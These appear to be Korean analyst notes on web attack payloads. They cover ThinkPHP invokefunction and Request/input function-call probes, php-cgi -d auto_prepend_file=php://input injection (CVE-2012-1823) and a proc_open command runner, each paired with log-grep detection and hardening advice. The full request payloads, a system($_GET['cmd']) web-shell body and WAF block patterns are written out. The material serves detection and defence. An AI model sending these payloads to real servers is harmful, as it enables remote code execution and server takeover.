## 📎 예제 1. ThinkPHP `invokefunction` POC (MD5 페이로드)

* 아래 페이로드는 `임의 함수 호출(POC)`, 성공하면 **RCE로 악용 가능**

```
/?s=../\think\Container/invokefunction
&function=call_user_func_array
&vars[0]=md5
&vars[1][]=HelloThinkPHP
```

* 의도: 내부에서 `call_user_func_array('md5', ['HelloThinkPHP'])` 실행 유도 → 응답으로 MD5가 나오면 호출 성공.


### 완전한 RCE가 되려면 (필수 조건)

1. 공격자가 `vars[0]` 등으로 `system`, `exec`, `shell_exec`, `eval` 등을 지정할 수 있어야 함
2. 서버/프레임워크가 **함수명 검증(화이트리스트)** 또는 **disable_functions** 같은 보호를 하지 않을 것
3. 함수 실행 결과가 외부로 노출되거나 파일 쓰기/명령 실행이 가능할 것


### 불완전(실패) 조건 예시

* `invokefunction` 접근에 인증/권한 필요
* 함수 호출 시 화이트리스트 적용
* `disable_functions`로 위험 함수 비활성화
* WAF/필터가 요청 차단
* 호출 결과가 외부에 노출되지 않음


### 즉시 탐지/확인

* 요청 패턴 로그 검색

  ```bash
  # nginx/apache 액세스 로그에서 탐지
  grep -R "invokefunction" /var/log/nginx* /var/log/apache2* 
  grep -R "call_user_func_array" /var/log/nginx* /var/log/apache2*
  grep -R "vars%5B0%5D" /var/log/nginx* /var/log/apache2*
  ```
* POC 응답 직접 확인 (서버가 MD5 반환시)

  ```bash
  # 로컬에서 MD5 확인 (예: HelloThinkPHP)
  echo -n "HelloThinkPHP" | md5sum
  ```
* PHP 환경 확인

  ```bash
  php -r "echo ini_get('disable_functions').PHP_EOL;"
  php -r "echo ini_get('open_basedir').PHP_EOL;"
  ```

### 예방법

1. WAF/방화벽에서 아래 패턴 차단:
   * `think\Container/invokefunction`
   * `call_user_func_array`
   * `vars[0]=`, `vars[1]=` 등의 인자 전달 패턴
2. ThinkPHP 버전 즉시 패치(공식 패치 적용)
3. `disable_functions` 에 `system, exec, shell_exec, passthru, popen, proc_open, eval` 등 추가 검토
4. `open_basedir`/파일 권한 제한, 웹 프로세스 쓰기권한 최소화
5. 전체 포렌식(응답으로 POC 성공 시 필수)

---
## 📎 예제 1-1. ThinkPHP 내부 메서드 호출
엔드포인트가 **임의 함수 호출/입력 필터링 취약**이 있는지 탐지(예: ajax.do 와 같은 파일 경로에서)
응답에 `okhacked`가 포함되면 성공 확인, 이후 추가로 민감정보(설정파일, 소스코드)를 수집하거나 RCE로 확장 가능

```
s\=/index/\\think\\Request/input&filter\=var_dump&data\d3e827b198d120okhacked
```


* `s=/index/\think\Request/input`

  * `s` 파라미터는 ThinkPHP 계열(및 일부 PHP 프레임워크)의 라우팅/펑션 호출 파라미터로 악용되는 경우가 많습니다.
  * `\think\Request`는 PHP 네임스페이스 표기(백슬래시) — 로그/URL에선 `\\` 또는 이스케이프 형태로 기록될 수 있습니다.
  * 전체적으로는 `\think\Request::input()` 같은 내부 메서드(또는 해당 경로의 컨트롤러/함수)에 접근하려는 시도로 해석됩니다. 즉, **내부 함수/메서드를 직접 호출하려는 의도**.

* `filter=var_dump`

  * 공격자는 서버 측에서 **전달된 값에 `var_dump`를 적용하게 만들려 함**. 즉, 서버가 `filter` 파라미터를 곧바로 함수명으로 취급해 `filter(data)` 처럼 호출하는 취약한 처리 로직을 노린 것입니다. 성공하면 서버가 `var_dump()` 결과를 그대로 응답에 출력합니다(정보 노출 확인용).

* `data=�d3e827b198d120okhacked`

  * `data`는 호출될 입력값. `okhacked` 같은 문자열은 **성공 판별자**(attacker marker)로 흔히 사용됩니다.
  * `d3e827b198d120`처럼 보이는 부분은 페이로드 식별자(해시/토큰)거나 단순 랜덤 문자열일 가능성이 큽니다.

요약하면: 공격자는 `s` 파라미터로 내부 함수(또는 메서드)를 호출하고, `filter` 파라미터로 `var_dump`를 강제로 적용해 `data` 내용을 서버 응답으로 받아보려는 **정보 노출 / 취약성 탐지** 시도를 했습니다.


### 공격 메커니즘

* **취약한 처리**: 애플리케이션이 `s`를 내부 경로 호출로, `filter`를 함수 호출로 검증 없이 직접 사용한다면 사용자가 임의의 PHP 함수(예: `var_dump`, `system`, `eval` 등)를 실행하게 할 수 있습니다.
* **정보 유출**: `var_dump`가 성공하면 파일 내용, 변수 값, 객체 구조 등 민감 정보가 응답에 포함될 수 있음 → DB 자격증명·설정파일 노출 가능.
* **RCE 체인 가능성**: 만약 `filter`로 `assert`나 `eval` 같은 함수가 호출 가능하면 원격 코드 실행(RCE)으로 이어질 수 있음.
* **php://filter 결합**: `php://filter/convert.base64-encode/resource=...` 같이 사용하면 파일의 소스(코드)를 base64로 읽어 응답에 반환할 수 있어 설정파일(DB 접속 문자열) 탈취에 아주 흔히 쓰입니다.
  

---
## 📎 예제 2. php-cgi(또는 php-cgi.exe) 취약점/오용을 이용한 원격코드실행(RCE)

**php-cgi(또는 php-cgi.exe)** 를 통해 PHP 런타임 설정을 조작해서 `php://input`(요청 바디)을 PHP 코드로 실행하게 만드는 기법.
php-cgi는 PHP 인터프리터의 CGI(Common Gateway Interface) 실행 파일로, PHP 코드를 해석·실행하는 프로그램 중 하나.

1. **php-cgi 바이너리가 외부에서 CGI 방식으로 직접 접근 가능**해야 함 (`/cgi-bin/php-cgi` 등).
2. 서버가 쿼리스트링의 `-d` 인자(또는 유사 설정)를 **실제로 처리/허용**해야 함(패치/설정으로 차단되지 않아야 함).
3. 요청의 쿼리스트링에 `-d auto_prepend_file=php://input`(또는 유사 지시문)이 **정확히 포함**되어야 함.
4. 요청 바디(POST) 에 **실행 가능한 PHP 코드**(예: `<?php ... ?>`)가 포함되어야 하고, 서버가 그 내용을 실행하도록 설정 변경이 가능해야 함.
5. WAF/방화벽/서버 설정이 요청을 차단하지 않아야 함.

### 페이로드 예시

HTTP GET 요청(쿼리 인코딩된 형태):

```
GET /cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input HTTP/1.1
Host: victim.com
...
```

그리고 바로 뒤에 POST 바디(요청 바디)에 실행할 PHP 코드:

```
<?php system($_GET['cmd']); ?>
```

또는 POC 단순 확인용:

```
<?php echo 'RCE_OK_12345'; ?>
```

이렇게 구성되면 php-cgi가 `auto_prepend_file=php://input`을 적용하여 요청 바디의 PHP 코드를 자동으로 포함·실행하게 되고, 응답 바디에 `RCE_OK_12345` 같은 토큰이 보이면 성공을 의미합니다

* URL은 반드시 올바르게 URL-인코딩 (예: `-d+auto_prepend_file=php://input` → `-d%20auto_prepend_file%3Dphp%3A%2F%2Finput`)


### 즉시 탐지/확인

* 액세스 로그에 `php-cgi` 또는 `php-cgi.exe` 호출이 있는지:

  ```bash
  grep -R "php-cgi" /var/log/nginx* /var/log/apache2*
  ```
* 의심 쿼리 문자열(`-d` 또는 `auto_prepend_file` 또는 `php://input`) 검색:

  ```bash
  grep -R "%2d\|auto_prepend_file\|php://input" /var/log/nginx* /var/log/apache2* || true
  ```
* HTTP 응답/애플리케이션 로그에 POC 토큰(예: `RCE_OK_` 또는 `33zVO2dZ...`) 검색:

  ```bash
  grep -R "RCE_OK_12345\|33zVO2dZw" /var/log/*
  ```
* 웹루트에 임의 파일 생성/변경 여부 확인(특히 .php 파일):

  ```bash
  find /var/www -type f -iname "*.php" -mtime -7 -ls
  ```

---

## 📎 예제 2-1. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)

공격자가 웹 서버에 **악성 PHP 코드**를 삽입하고 실행

```
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
```

### 디코딩하면:

```
POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input
```

> `%AD`는 실제로는 **하이픈(-)** 의 잘못된 인코딩 (`-d`), `%3d`는 `=`를 의미합니다.


이 요청은 PHP 인터프리터에게 다음을 강제로 전달하려는 시도입니다:

| 파라미터                               | 설명                               |
| ---------------------------------- | -------------------------------- |
| `-d allow_url_include=1`           | PHP 설정을 동적으로 바꿔서 외부 URL 포함 허용    |
| `-d auto_prepend_file=php://input` | 요청 본문에 포함된 코드를 PHP 파일처럼 실행하겠다는 뜻 |


### 실제 공격 흐름

```http
POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input HTTP/1.1
Content-Type: text/plain

<?php system('id'); ?>
```

➡️ 공격자는 **PHP 설정을 강제로 우회해서** POST 요청 본문에 PHP 코드를 넣고 그걸 실행하도록 만듦
이 요청이 성공하면, **`id` 명령이 서버에서 실행되고**, 결과가 응답으로 돌아옵니다.
결국 공격자는 원격에서 시스템 명령을 자유롭게 실행할 수 있게 됩니다.


### 🔥 전형적인 PHP CGI 취약점 공격

이건 **CVE-2012-1823**라는 취약점을 기반으로 한 **PHP-CGI 명령어 인젝션** 공격입니다.
CGI 방식으로 PHP가 실행될 때 쿼리스트링에서 ini 설정을 허용하는 구성이 있을 경우 악용 가능합니.

### 관련 정보:

| 항목      | 내용                                                    |
| ------- | ----------------------------------------------------- |
| 취약점     | **CVE-2012-1823**                                     |
| 영향받는 환경 | PHP가 CGI 모드로 동작하며, 웹서버가 `query string`을 해석하지 않고 넘길 경우 |
| 결과      | 공격자가 임의 PHP 설정 추가 (`-d`), 코드 실행 가능 (`php://input`)    |
| 피해      | 완전한 서버 탈취 가능 (웹쉘 업로드 등)                               |

---

## 📎 예제 2-2. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)

```
https://www.we.net/php-cgi/php-cgi.exe?
-d cgi.force_redirect=0 
-d cgi.redirect_status_env 
-d allow_url_include=1 
-d auto_prepend_file=php://input
```

`-d` 옵션은 PHP 실행 시 ini 설정을 커맨드라인에서 덮어쓰는 옵션입니다. CGI 환경에서 취약하게 설정된 경우, 공격자는 **쿼리스트링으로 `-d` 옵션을 전달**해 런타임 ini 값을 변경할 수 있습니다. 

* `cgi.force_redirect=0` — 일부 보호 메커니즘을 비활성화해 직접 CGI 실행을 허용하게 함(취약 환경에서 필요).
* `allow_url_include=1` — 원격 URL 포함 허용(위험).
* `auto_prepend_file=php://input` — PHP가 스크립트를 실행하기 전에 HTTP 본문(POST 바디)을 포함하도록 설정. 즉, 공격자는 POST 몸체에 PHP 코드를 넣으면 그 코드가 자동으로 포함되어 실행됩니다.

공격자는 이 GET(또는 GET+POST) 요청으로 PHP 런타임 설정을 바꾸고 **POST 본문에 담긴 PHP 코드가 곧바로 실행되게** 만들어 RCE를 달성하려 합니다.

1. 공격자가 `php-cgi.exe? -d ... auto_prepend_file=php://input` 형태로 요청 보냄.
2. 웹서버가 해당 php-cgi를 CGI로 실행하면서 `-d` 파라미터를 적용(취약한 설정이면).
3. 공격자는 같은 요청에서 POST 바디에 `<?php system($_GET['cmd']); ?>` 같은 PHP 페이로드를 넣음.
4. PHP가 요청을 처리할 때 `php://input` (POST body)을 자동 포함 → 페이로드가 실행됨 → RCE 달성.
5. 공격 완료 후 흔적 제거(예: unlink 같은 PHP 명령)도 가능.

---

## 📎 예제 3. PHP 코드의 proc_open을 이용한 시스템 명령 RCE

서버에서 명령을 실행(proc_open)하고 결과를 HTTP로 돌려주는 전형적인 원격 명령 실행(RCE) / 웹쉘 설치 시도
proc_open 페이로드(원격 명령 실행 시도)와 eval_stdin.php가 함께 발견되면 공격자는 서버에서 원격으로 코드를 보내 eval()로 실행시키는 체계를 구축
 * eval_stdin.php 이름으로 짐작되는 파일은 보통 php://stdin 또는 요청 바디를 eval()로 실행하도록 만든 웹쉘/원격 코드 실행 러너입니다.

```php
<?php
$sp2b9876 = proc_open(
    'uname -a',
    array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'r')
    ),
    $sp71a4e7
);
echo stream_get_contents($sp71a4e7[1]);
?>
```

* `<?php ... ?>`
  PHP 코드 블록 — 웹서버가 이 파일을 해석하면 코드가 실행됩니다.

* 변수명 (`$sp2b9876`, `$sp71a4e7`)
  무작위화된 변수명(난독화 시도). 공격자는 흔히 랜덤 이름을 써서 탐지를 피하려 합니다.

* `proc_open(command, descriptorspec, &pipes)`

  * **기능**: 새로운 프로세스를 생성하고 표준 입출력 스트림(stdin/stdout/stderr)을 파이프에 연결합니다.
  * `command`: 여기서는 `'uname -a'` — 리눅스/유닉스 시스템 정보를 출력하는 명령. 공격자는 보통 권한·환경 확인용으로 이런 명령부터 실행합니다.
  * `descriptorspec`: 0(stdin), 1(stdout), 2(stderr)에 대한 설정. `array('pipe', 'r')` 은 읽기/쓰기 파이프 연결을 뜻합니다.
  * `$sp71a4e7`(참조로 전달): 생성된 파이프(리소스 핸들)들이 이 변수에 채워집니다. 예: `$sp71a4e7[0]` = 쓰기용(프로세스 stdin), `[1]` = 읽기용(stdout), `[2]` = 읽기용(stderr).

* `stream_get_contents($sp71a4e7[1])`

  * `$sp71a4e7[1]`(stdout 파이프)에서 출력된 모든 내용을 읽습니다. 결국 `uname -a`의 출력(커널 명/버전 등)을 읽어 `echo`로 응답에 쏩니다.

* `echo`

  * 실행 결과를 HTTP 응답 본문으로 출력 — 공격자는 이렇게 서버에서 명령을 실행하고 결과를 원격으로 확인합니다.

### 전개 패턴

  1. 서버의 OS·커널·환경 확인 (`uname -a`) — 권한 상승, 취약점 선택에 참고.
  2. 원격 명령 실행(RCE) 검증: 단일 명령을 실행해 응답을 확인하면 접근 가능 여부 확인.
  3. 이어서 파일 업로드, 추가 바이너리 다운로드, 웹쉘 설치, 내부 네트워크 스캔 등으로 확장될 가능성 큼.

* **주입 경로(흔한 수단)**

  * 파일 업로드 취약점(확장자/확장자 검증 실패)
  * LFI(Local File Inclusion) 취약점을 통한 로그/업로드 파일 포함
  * 취약한 플러그인/테마(특히 워드프레스)
  * 미스컨피규어된 eval/인클루드 사용 코드

### 📌 변형/유사 페이로드 (공격자들이 자주 쓰는 다른 함수들)

* `system('command')`, `exec('command', $out)`, `shell_exec('command')`, `` `command` `` (백틱), `popen()`, `passthru()`
* `proc_open`은 더 정교한 I/O 제어가 가능해서 선호되기도 함.

